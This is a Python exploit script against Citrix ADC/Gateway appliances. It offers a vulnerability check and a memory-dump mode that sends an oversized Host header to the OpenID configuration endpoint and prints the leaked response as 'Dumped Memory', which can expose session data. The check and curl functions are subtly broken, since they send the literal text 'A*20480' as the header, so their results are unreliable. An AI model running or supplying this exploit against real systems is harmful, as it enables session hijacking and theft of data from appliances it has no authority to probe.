#!/usr/bin/env python3

import sys
import requests
import urllib3
import argparse
import xml.dom.minidom

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up argument parser
parser = argparse.ArgumentParser(description='Check for vulnerabilities or dump memory from Citrix ADC/Gateway')
parser.add_argument('--target', help='The Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)', required=True)
parser.add_argument('--endpoint', help='The endpoint to be tested (e.g. /nf/auth/startwebview.do)', default='/nf/auth/startwebview.do')
parser.add_argument('--check-vuln', action='store_true', help='Flag to check for specific vulnerability')
parser.add_argument('--curl', action='store_true', help='Flag to curl the URL and format response as XML')
parser.add_argument('--dump-memory', action='store_true', help='Flag to dump memory from the target')
parser.add_argument('--buffer-size', type=int, default=20480, help='Buffer size for dumping memory (default: 20480)')

args = parser.parse_args()

if args.target is None:
    print('Target must be provided (e.g. --target 192.168.1.200)')
    sys.exit(0)

hostname = args.target
endpoint = args.endpoint

def check_vulnerability(url):
    headers = {"Host": "A*20480"}

    try:
        response = requests.get(f"https://{url}{endpoint}", headers=headers, verify=True, timeout=10)
        if response.status_code == 200:
            print(f"Received status 200 from {url}")
            if "/nf/auth/webview/done" in response.text and "AuthenticationRequirements" in response.text:
                print(f"Potential vulnerability found at {url}")
            else:
                print(f"No indicators of vulnerability found at {url}")
        else:
            print(f"Received unexpected status code {response.status_code} from {url}")
    except requests.RequestException as e:
        print(f"Error occurred during request: {e}")

def curl_and_format_xml(url):
    headers = {"Host": "A*20480"}

    try:
        response = requests.get(f"https://{url}{endpoint}", headers=headers, verify=True)
        if response.status_code == 200:
            try:
                xml_content = response.text
                dom = xml.dom.minidom.parseString(xml_content)
                pretty_xml_as_string = dom.toprettyxml()
                print("Response (Pretty XML):\n", pretty_xml_as_string)
            except Exception as e:
                print("Response (Non-XML content):", response.text[:500])  # Print first 500 chars
        else:
            print(f"Request failed with status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Error occurred during request: {e}")

def dump_memory(hostname, buffer_size):
    headers = {
        "Host": "a" * buffer_size
    }
    try:
        r = requests.get(f"https://{hostname}/oauth/idp/.well-known/openid-configuration", headers=headers, verify=False, timeout=10)
        if r.status_code == 200:
            print("--- Dumped Memory ---")
            print(r.text[131050:])  # Adjust this as needed
            print("---      End      ---")
        else:
            print("Could not dump memory. Status code:", r.status_code)
    except requests.RequestException as e:
        print(f"Error occurred during request: {e}")

if __name__ == "__main__":
    if args.check_vuln:
        check_vulnerability(hostname)
    elif args.curl:
        curl_and_format_xml(hostname)
    elif args.dump_memory:
        dump_memory(hostname, args.buffer_size)
    else:
        print("Please provide either --check-vuln, --curl, or --dump-memory flag to proceed.")
